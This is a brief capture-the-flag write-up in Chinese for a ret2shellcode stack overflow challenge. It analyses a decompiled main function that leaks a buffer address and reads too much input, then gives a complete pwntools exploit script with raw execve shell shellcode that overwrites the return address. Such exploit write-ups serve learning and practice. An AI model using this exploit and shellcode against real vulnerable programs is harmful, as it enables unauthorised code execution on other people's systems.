#### ret2shellcode
1.  分析过程
    查看main函数：
    ```c
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
        __int64 buf[2]; // [rsp+0h] [rbp-10h] BYREF

        buf[0] = 0LL;
        buf[1] = 0LL;
        setvbuf(_bss_start, 0LL, 1, 0LL);
        printf("Write to here [%p]\n", buf);    // 直接给了buf的地址
        puts("Input anything : ");
        read(0, buf, 0x400uLL);                 // 注入点
        return 0;
    }   
    ```
    查看没有system函数，也没有后面字符串，但是NX没开，可以输入shellcode  
    查看buf的栈结构，发现buf和r之间只有0x10+0x8位，可以溢出覆盖返回地址，但是不足以塞下shellcode，于是考虑将shellcode塞在r后面，将返回地址塞在返回地址后面，返回地址的值用buf地址+增量0x10+0x8+0x8计算得出。
    ```
    -0000000000000010 buf             dq ?
    -0000000000000008 var_8           dq ?
    +0000000000000000  s              db 8 dup(?)
    +0000000000000008  r              db 8 dup(?)
    +0000000000000010 ; 将shellcod塞在这里（但是为什么能塞得下我还不清楚）
    +0000000000000010 ; end of stack variables
    ```
2. exp.py
    ```python
    from pwn import *
    io = process('./pwn')
    io.recvuntil(b"Welcome to SDCCTF 2023 Final!\n")
    buf_addr = io.recvline(keepends=False)      
    buf_addr = buf_addr[len("Write to here ["):-1].decode("ascii")  # 把接收到的byte格式地址转换成string
    buf_addr = int(buf_addr, 16)                                    # 转换16进制string为数字
    ret_addr = buf_addr + (0x10+0x8+0x8)                            # 返回地址 = buf地址+增量，包含r长度
    shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
    payload = b"a"*(0x10+0x8) + p64(ret_addr) + shellcode           # 填充位 + 返回地址 + shellcode，填充位不包含r长度
    io.recvuntil(b"Input anything : \n")
    io.sendline(payload)
    io.interactive() 
    ```
